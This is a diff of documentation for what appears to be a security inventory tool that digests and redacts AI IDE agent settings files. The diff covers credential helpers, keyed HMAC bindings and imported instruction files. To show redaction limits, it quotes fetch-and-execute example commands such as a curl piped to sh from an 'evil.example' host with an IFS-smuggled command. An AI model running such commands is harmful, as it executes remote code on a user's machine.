@@ -331,13 +331,18 @@ its TOML. A recognized file that cannot be read or parsed is a failure. So is a 
 whose digest or keyed binding has no RFC 8785 form, such as TOML with a date: the
 failure names it, and the record then carries no keyed binding.
 
-The digests of `.codex/config.toml`, `.cursor/cli.json` and the Antigravity, xAI and
-Copilot files always cover the file after the standard
+Every digest in `settings_hashes` covers the file after the standard
 [redaction](security-model.md#known-false-positive-and-false-negative-classes), with
-`env` names but not their values: a URL keeps only its scheme, host and port, and a
-credential in an assignment, after an authorization scheme or in a known token format
-is removed. The redaction is applied separately to the text between the shell
-operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
+or without the key, and the record names that form in `settings_hashes_profile`,
+`nexus-symbiote/ide-settings-redacted/v1`. It keeps `env` names but not their values,
+and the keys of the Claude Code credential helpers `apiKeyHelper`, `awsAuthRefresh`,
+`awsCredentialExport`, `gcpAuthRefresh` and `otelHeadersHelper`, wherever a settings file names one, but
+not their commands: each becomes `***` whatever it is, since a helper command such as
+`printf passphrase` can hold a credential the redaction does not recognise. No helper
+is run. A URL keeps only its scheme, host and
+port, and a credential in an assignment, after an authorization scheme or in a known
+token format is removed. The redaction is applied separately to the text between
+the shell operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
 which are kept, so a URL or an assigned value ends at the first of them: a command,
 an operator or a host written after one without white space, such as
 `https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
@@ -360,24 +365,28 @@ are redacted the same way, so of two entries whose keys differ only in
 what the redaction removes, the digest covers the last one in the file. Anyone holding
 the BOM therefore cannot confirm a guess of a value the
 redaction removes, such as the environment value of an MCP server that
-`.codex/config.toml` declares, which the `mcp` record withholds too. The cost is that
-without the key a change to such a value alone, such as a new token or URL path on
-the same host in a `notify` command such as
+`.codex/config.toml` declares, which the `mcp` record withholds too, or a
+credential helper command. The cost is that
+without the key a change to such a value alone, such as a new helper command, or a
+new token or URL path on the same host in a `notify` command such as
 `TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
-then carries a low `completeness` finding that names the key. Without
-`NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` the digests of the other files cover the file as
-read, so any changed value changes the record, and anyone holding the BOM can confirm
-a guess of a whole settings file, including the environment values of the MCP servers
-that `.gemini/settings.json` declares. Reordered keys and whitespace change no digest.
-With the key, every digest covers the file after the redaction, and
-`static_value_binding` is an HMAC-SHA256 under the key over every file as read
+then carries a low `completeness` finding that names the key. Reordered keys and
+whitespace change no digest. With the key, `static_value_binding` is an HMAC-SHA256
+under the key over every file as read
 (profile `nexus-symbiote/ide-settings-values/v1`), so the record still changes with
 any value while no unkeyed digest covers environment values or text the redaction
 removes. A value the redaction leaves in place, such as a password pasted into a hook
 command or stored under a key name, can still be confirmed from the digest, so keep
-credentials out of settings files. Collect the baseline and every later snapshot with
-the same key, or without one: the binding appears only with the key, and the digests
-of the files read as is differ between the two modes.
+credentials out of settings files. The digests agree between a keyed and an unkeyed
+collection, except that without the key a file holding an ambiguous URL authority is
+a failure instead of a digest, so enabling the key later changes no recorded digest;
+the binding itself appears only with the key. A record from an earlier build has no
+`settings_hashes_profile`, so `diff` reports the profile as added, a medium alert
+that fails `--fail-on-alert`, and project validation does not reconcile the record.
+Its digest of a file the redaction leaves as it is matches this build's, but earlier
+builds digested most files as read without the key and kept every credential helper
+command with it, so the digest of a file with an `env` map, a helper or another
+redacted value can also differ, a high alert. Record the baseline again.
 
 The `claude-code` record also counts what the files declare: hook handlers per event
 (`declared_hooks`), allow, ask and deny rules (`declared_permission_rule_counts`),
@@ -385,12 +394,51 @@ and, in `settings_declarations`, additional directories, plugins, marketplaces,
 environment variables and MCP server approvals. The `cursor` record counts the
 commands of `.cursor/hooks.json` in `properties.hook_commands`.
 
+## Imported instruction files
+
+A memory file's `@path` import keeps the unkeyed `content_hash` that every instruction
+file carries only when the path imported, and the file a symlink there leads to, if
+any, both have a Markdown suffix (`.md`, `.mdc` or `.markdown`). Any other import is
+inventoried without `content_hash`, and `properties.content_hash_withheld` says why:
+its exact bytes may hold configuration or secrets, which an unkeyed digest would let
+anyone holding the BOM confirm by guessing. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
+set, `static_value_binding` is an HMAC-SHA256 under the key over the path imported and
+the file's text (profile `nexus-symbiote/prompt-import-content/v1`); without the key
+the record carries a low `completeness` finding that names it. An import is a gap and
+is not read when the path imported, or the file a symlink there leads to, is
+[named as holding credentials](#files-named-as-holding-credentials).
+
+`validate --project` with the key recomputes the binding from the file and counts it
+as a verified hash, and a changed file as a failed one. A binding under another
+profile or key cannot be checked and is unknown evidence. Without the key, or for an
+inventory collected without one, nothing binds the content: the integrity check counts
+the record in `hashes_unbound` and lists it as an `info` issue, the completeness check
+does not report a missing hash, and a change to the file passes validation. Project
+reconciliation compares each record with a fresh collection, so validate with the key
+the inventory was collected with, or without one if it was collected without one.
+
+## Files named as holding credentials
+
+The `prompt` collector does not read a file without a Markdown suffix whose name, or a
+directory on whose path, says it holds credentials, as the
+[known limitations](known-limitations.md#instructions-and-ide-settings) list them, such
+as `.env`, `config/secrets.json` or `secrets/token.txt`, so no `content_hash`, skill
+digest or keyed binding covers it. Such a file is a coverage gap when a memory file
+imports it; when an instruction file such as `CLAUDE.md`, a rule, prompt or subagent
+file, an import or a file of a skill or command directory is a symlink to it, whatever
+that file is named; and when a rule, prompt, subagent, skill or command directory holds
+it, while the directory's other files are inventoried as usual. A symlink replaced
+between that check and the read, so that the read follows it to such a file, is a
+collection failure, and nothing read is kept. A symlink to any other in-root file, such
+as `CLAUDE.md` to `AGENTS.md`, is read through its target.
+
 ## Upgrade existing snapshots
 
 Older static MCP snapshots lack the source binding and configured tool locators,
 and older A2A snapshots lack the structure digests or carry the superseded
 `nexus-symbiote/a2a-card-structure/v1` or `v2` profile; older RAG records carry no
-structure digest, and older IDE agent records no keyed settings binding. They cannot establish this
+structure digest, and older IDE agent records no keyed settings binding and no
+`settings_hashes_profile`. They cannot establish this
 stronger reconciliation contract. Missing or unknown binding profiles fail
 validation and require recollection; copying a newly calculated digest into an
 old approved snapshot is not a migration.
